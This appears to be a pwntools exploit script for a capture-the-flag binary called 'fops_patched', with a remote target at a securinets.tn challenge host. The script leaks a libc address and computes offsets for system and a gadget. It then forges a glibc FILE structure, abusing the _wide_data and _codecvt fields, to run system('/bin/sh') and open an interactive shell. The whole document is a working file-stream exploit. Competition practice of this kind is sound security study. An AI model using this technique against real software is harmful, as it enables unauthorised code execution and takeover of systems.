from pwn import *

chal = ELF('./fops_patched')

HOST = 'pwn-14caf623.p1.securinets.tn'
PORT =  9002

gdbscript='''
dir ~/glibc
b *vuln +54
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

if args.GDB:
    conn = gdb.debug([chal.path], gdbscript)
elif args.REMOTE:
    conn = remote(HOST, PORT)
else:
    conn = process([chal.path])

def main():
    conn.recvuntil(b': ')
    
    addr_stdout = int(conn.recvline().strip(), 0x10)
    
    # FIXME
    addr_libc_base = addr_stdout - 0x1e85c0
    addr_system = addr_libc_base + 0x53110
    addr_stdfile_1_lock = addr_libc_base + 0x1e97b0
    addr_gadget = addr_libc_base + 0x001563c3 # add rdi, 0x10; jmp rcx;

    info(f'{addr_stdout = :#x}')
    info(f'{addr_libc_base = :#x}')
    info(f'{addr_system = :#x}')
    info(f'{addr_stdfile_1_lock = :#x}')
    info(f'{addr_gadget = :#x}')

    payload = flat({    
        0x0: 1, #  _flags
        0x8: addr_system + 0x4,             # _IO_read_ptr (_wide_data->_IO_write_base),
        0x10: addr_system + 0x3,            #_IO_read_end (_wide_data->_IO_write_ptr)
        0x20: 0,                            # _IO_write_base (_codecvt->__cd_out->step->__shlib_handle)
        0x28: 1,                            # _IO_write_ptr
        0x30: b'/bin/sh\0',                 # rdi + 0x10
        0x38: 0,                            # _IO_buf_base (_wide_data->_IO_backup_base)
        0x48: addr_gadget,                  # _IO_save_base (_codecvt->__cd_out->step->__fct)
        0x50: 0,                            # _IO_backup_base
        0x58: addr_stdout + 0x20,           # _IO_save_end (_codecvt->__cd_out->step) +0x60, +0x68, +0x80 will be overwitten
        0x88: addr_stdfile_1_lock,          # _lock
        0x98: addr_stdout + 0x58 - 0x38,    # _codecvt
        0xa0: addr_stdout + 0x8 - 0x18,     # _wide_data
        0xc0: 1,  # _mode
    }, filler=b'\0', length=0xd8)

    conn.send(payload)
    conn.interactive()

if __name__ == '__main__':  
    main()
